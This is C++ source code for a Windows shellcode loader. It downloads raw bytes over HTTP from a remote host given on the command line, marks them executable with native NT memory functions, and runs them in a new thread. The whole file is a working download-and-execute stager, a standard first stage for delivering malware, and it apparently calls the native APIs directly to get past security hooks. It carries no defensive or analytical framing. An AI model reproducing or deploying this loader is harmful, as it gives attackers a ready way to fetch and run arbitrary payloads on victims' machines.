#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include <winhttp.h>
#include <vector>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "winhttp")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS


#define NtCurrentProcess()	   ((HANDLE)-1)
#define DEFAULT_BUFLEN 4096

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

EXTERN_C NTSTATUS NtWaitForSingleObject(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);


void RunShellcode(char* shellcode, DWORD shellcodeLen) {
    PVOID BaseAddress = NULL;
    SIZE_T dwSize2 = 0x2000;

    PCSTR Terminator = NULL;
    NTSTATUS STATUS;

    NTSTATUS status1 = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1)) {
        return ;
    }


    RtlMoveMemory(BaseAddress, shellcode, shellcodeLen);



    HANDLE hThread;
    DWORD OldProtect = 0;

    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &dwSize2, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        return;
    }

    printf("\n\nShellcode_mem  :  %p\n\n", BaseAddress);

    getchar();

    HANDLE hHostThread = INVALID_HANDLE_VALUE;


    NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        printf("[!] Failed in sysNtCreateThreadEx (%u)\n", GetLastError());
        return;
    }

    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;


    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in sysNtWaitForSingleObject (%u)\n", GetLastError());
        return;
    }
}

void getShellcode_Run(wchar_t* whost, DWORD port, wchar_t* wresource) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

 
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    
                    // Run the shellcode
                    RunShellcode(pszOutBuffer, dwSize + 1);

                }

            }

        } while (dwSize > 0);



        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

}


int main(int argc, char** argv) {

    // Validate the parameters
    if (argc != 4) {
        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);
        return 1;
    }
    char* host = argv[1];
    DWORD port = atoi(argv[2]);
    char* resource = argv[3];

    const size_t cSize1 = strlen(host) + 1;
    wchar_t* whost = new wchar_t[cSize1];
    mbstowcs(whost, host, cSize1);
    
  
    const size_t cSize2 = strlen(resource) + 1;
    wchar_t* wresource = new wchar_t[cSize2];
    mbstowcs(wresource, resource, cSize2);

    getShellcode_Run(whost, port, wresource);
    
    return 0;

}